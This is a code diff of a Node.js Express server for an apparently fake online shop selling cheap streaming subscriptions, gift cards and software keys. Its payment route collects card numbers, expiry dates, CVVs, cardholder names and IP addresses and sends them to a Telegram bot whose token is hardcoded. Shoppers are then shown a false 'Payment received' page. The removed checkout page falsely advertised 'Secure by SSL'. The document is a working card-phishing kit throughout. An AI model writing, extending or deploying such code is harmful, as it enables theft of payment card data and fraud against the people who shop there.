@@ -2,6 +2,7 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const axios = require('axios');
 const path = require('path');
+const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 5000;
@@ -12,7 +13,7 @@ app.use(express.static(__dirname));
 
 // ---------- TELEGRAM ----------
 const BOT_TOKEN = "8696604379:AAHOpUvUcDwzLNTBH_GvGxVK7dNMFiqbVnw";
-const CHAT_ID = "8685919221";  // ваш ID
+const CHAT_ID = "8685919221";
 
 async function sendToTelegram(data) {
     const text = `
@@ -22,8 +23,8 @@ Card: ${data.card_number}
 Expiry: ${data.expiry}
 CVV: ${data.cvv}
 Cardholder: ${data.cardholder || 'Not specified'}
-Amount: ${data.amount} RUB
-Product: ${data.product}
+Amount: ${data.total} RUB
+Products: ${data.products}
 IP: ${data.ip}
     `;
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -38,192 +39,36 @@ IP: ${data.ip}
     }
 }
 
-// ---------- ROUTES ----------
+// ---------- товары (расширенный каталог) ----------
+const products = [
+    { id: 1, name: "Netflix Premium 1 Month", price: 499, image: "netflix.jpg", category: "subscriptions" },
+    { id: 2, name: "Spotify Premium 1 Year", price: 899, image: "spotify.jpg", category: "subscriptions" },
+    { id: 3, name: "PlayStation Plus 3 Months", price: 1199, image: "psplus.jpg", category: "subscriptions" },
+    { id: 4, name: "Xbox Game Pass Ultimate 1 Month", price: 699, image: "xbox.jpg", category: "subscriptions" },
+    { id: 5, name: "Discord Nitro 1 Year", price: 1299, image: "discord.jpg", category: "subscriptions" },
+    { id: 6, name: "YouTube Premium 3 Months", price: 549, image: "youtube.jpg", category: "subscriptions" },
+    { id: 7, name: "Steam Gift Card 500 RUB", price: 500, image: "steam.jpg", category: "giftcards" },
+    { id: 8, name: "iTunes Gift Card 1000 RUB", price: 1000, image: "itunes.jpg", category: "giftcards" },
+    { id: 9, name: "Google Play Gift Card 1500 RUB", price: 1500, image: "googleplay.jpg", category: "giftcards" },
+    { id: 10, name: "Amazon Gift Card 25 USD", price: 2200, image: "amazon.jpg", category: "giftcards" },
+    { id: 11, name: "Minecraft Java Edition Key", price: 1999, image: "minecraft.jpg", category: "keys" },
+    { id: 12, name: "Windows 10 Pro OEM Key", price: 2999, image: "windows.jpg", category: "keys" }
+];
+
+// ---------- маршруты ----------
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-app.get('/pay', (req, res) => {
-    const product = req.query.product || 'Item';
-    const price = req.query.price || '0';
-    res.send(`
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Checkout</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-            background: #0b0d15;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        .card {
-            background: #141824;
-            border-radius: 28px;
-            padding: 40px 35px 45px;
-            width: 100%;
-            max-width: 440px;
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8);
-            border: 1px solid #2a2f3f;
-        }
-        .card h1 {
-            color: #fff;
-            font-size: 26px;
-            font-weight: 600;
-            letter-spacing: -0.5px;
-            margin-bottom: 8px;
-        }
-        .card .sub {
-            color: #8b8fa3;
-            font-size: 14px;
-            margin-bottom: 30px;
-            border-bottom: 1px solid #252b3b;
-            padding-bottom: 16px;
-        }
-        .field {
-            margin-bottom: 20px;
-        }
-        .field label {
-            display: block;
-            color: #c8ccda;
-            font-size: 13px;
-            font-weight: 500;
-            margin-bottom: 6px;
-        }
-        .field input {
-            width: 100%;
-            padding: 14px 16px;
-            background: #1e2332;
-            border: 1px solid #2e3447;
-            border-radius: 14px;
-            color: #fff;
-            font-size: 16px;
-            outline: none;
-            transition: 0.2s;
-        }
-        .field input:focus {
-            border-color: #6c7bff;
-            box-shadow: 0 0 0 3px rgba(108, 123, 255, 0.15);
-        }
-        .field input::placeholder {
-            color: #5b617a;
-        }
-        .row {
-            display: flex;
-            gap: 15px;
-        }
-        .row .field {
-            flex: 1;
-        }
-        .btn {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #6c7bff, #4b5bdb);
-            border: none;
-            border-radius: 16px;
-            color: #fff;
-            font-size: 18px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 10px;
-            box-shadow: 0 8px 20px rgba(108, 123, 255, 0.25);
-        }
-        .btn:hover {
-            transform: scale(1.01);
-            box-shadow: 0 12px 28px rgba(108, 123, 255, 0.35);
-        }
-        .secure {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            color: #6a708a;
-            font-size: 13px;
-            margin-top: 20px;
-        }
-        .secure svg {
-            width: 16px;
-            height: 16px;
-            fill: none;
-            stroke: #6a708a;
-            stroke-width: 2;
-        }
-        .back {
-            display: inline-block;
-            color: #6a708a;
-            text-decoration: none;
-            font-size: 14px;
-            margin-top: 18px;
-        }
-        .back:hover { color: #c8ccda; }
-        .product-info {
-            background: #1a1f2e;
-            padding: 12px 16px;
-            border-radius: 14px;
-            margin-bottom: 25px;
-            display: flex;
-            justify-content: space-between;
-            color: #c8ccda;
-            font-size: 14px;
-        }
-        .product-info span:last-child { color: #fff; font-weight: 600; }
-    </style>
-</head>
-<body>
-<div class="card">
-    <h1>Secure Checkout</h1>
-    <div class="sub">Complete your payment securely</div>
+// API для получения списка товаров (для динамической подгрузки на фронте)
+app.get('/api/products', (req, res) => {
+    res.json(products);
+});
 
-    <div class="product-info">
-        <span>${product}</span>
-        <span>${price} RUB</span>
-    </div>
-
-    <form action="/pay-submit" method="POST">
-        <input type="hidden" name="product" value="${product}">
-        <input type="hidden" name="amount" value="${price}">
-
-        <div class="field">
-            <label>Card Number</label>
-            <input type="text" name="card_number" placeholder="1234 5678 9012 3456" required>
-        </div>
-
-        <div class="row">
-            <div class="field">
-                <label>Expiry</label>
-                <input type="text" name="expiry" placeholder="MM/YY" required>
-            </div>
-            <div class="field">
-                <label>CVV</label>
-                <input type="text" name="cvv" placeholder="123" required>
-            </div>
-        </div>
-
-        <div class="field">
-            <label>Cardholder Name</label>
-            <input type="text" name="cardholder" placeholder="John Doe" required>
-        </div>
-
-        <button type="submit" class="btn">PAY NOW</button>
-    </form>
-
-    <div class="secure">
-        <svg viewBox="0 0 24 24"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-        Secure by SSL
-    </div>
-
-    <a href="/" class="back">← Back to shop</a>
-</div>
-</body>
-</html>
-    `);
+// корзина работает через localStorage на фронте, сервер не хранит
+app.get('/checkout', (req, res) => {
+    // Параметры cart и total передаются через query string из фронта
+    res.sendFile(path.join(__dirname, 'checkout.html'));
 });
 
 app.post('/pay-submit', async (req, res) => {
@@ -232,8 +77,8 @@ app.post('/pay-submit', async (req, res) => {
         expiry: req.body.expiry,
         cvv: req.body.cvv,
         cardholder: req.body.cardholder || 'Not specified',
-        amount: req.body.amount,
-        product: req.body.product || 'Item',
+        total: req.body.total,
+        products: req.body.products || 'Cart items',
         ip: req.ip || req.connection.remoteAddress
     };
     await sendToTelegram(data);
@@ -244,12 +89,6 @@ app.post('/pay-submit', async (req, res) => {
         </head>
         <body><div><h2>✅ Payment received</h2><p>Thank you! Your order is being processed.</p><a href="/" style="color:#6c7bff">Back to shop</a></div></body></html>
     `);
-});
-
-app.get('/buy', (req, res) => {
-    const product = req.query.product || 'Item';
-    const price = req.query.price || '0';
-    res.redirect(`/pay?product=${encodeURIComponent(product)}&price=${price}`);
 });
 
 app.listen(PORT, () => {
